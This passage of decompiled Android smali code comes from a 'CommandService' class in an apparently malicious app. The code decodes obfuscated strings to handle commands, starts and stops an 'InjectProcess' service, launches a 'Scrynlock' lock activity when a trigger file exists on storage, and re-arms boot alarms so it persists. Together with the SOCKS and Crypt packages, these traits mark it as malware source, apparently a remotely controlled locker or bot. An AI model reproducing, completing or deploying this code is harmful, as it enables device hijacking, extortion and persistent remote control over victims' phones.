    if-ne v0, v11, :cond_1a

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    new-instance v5, Landroid/content/Intent;

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-class v7, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_1a
    aget-object v0, v4, v1

    const-string v5, "\u0012}.y\u001e@/c$j5"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_1b

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    new-instance v5, Landroid/content/Intent;

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-class v7, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    :cond_1b
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_3

    :cond_1c
    const-string v0, "p"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    goto/16 :goto_1

    :cond_1d
    const-string v1, "%[7[3\u001e:J\"\\1@\"W\""

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-ne v1, v11, :cond_0

    goto/16 :goto_2

    :cond_1e
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "\u00000]7H%\u0001\"W\""

    invoke-static {v4}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1f

    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v0

    if-eqz v0, :cond_1f

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_1f
    sget-object v0, Lcompse/refact/st/upsssss/CommandService;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-virtual {v3}, Landroid/os/PowerManager$WakeLock;->release()V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-class v3, Lcompse/refact/st/upsssss/Boot;

    invoke-direct {v0, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    invoke-static {v1, v2, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-string v3, " e {,"

    invoke-static {v3}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    invoke-virtual {v0, v1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    :try_start_0
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->zxcvxvsdvsvsvs:Ljava/lang/Integer;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v4

    invoke-virtual {v0, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0
.end method

.method public zxcvxvsdvsvsvs()Ljava/lang/String;
    .locals 4

    const/4 v2, 0x1

    const-string v0, "8\u00007"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-string v3, "j.g/l\"}(\u007f(}8"

    invoke-static {v3}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0, v2}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v3

    invoke-virtual {v3}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v3

    if-eqz v3, :cond_0

    const-string v0, "X?I?"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getType()I

    move-result v0

    if-nez v0, :cond_1

    move v0, v2

    :goto_1
    if-eqz v0, :cond_2

    const-string v0, "d.k(e$"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    move-object v0, v1

    goto :goto_0
.end method
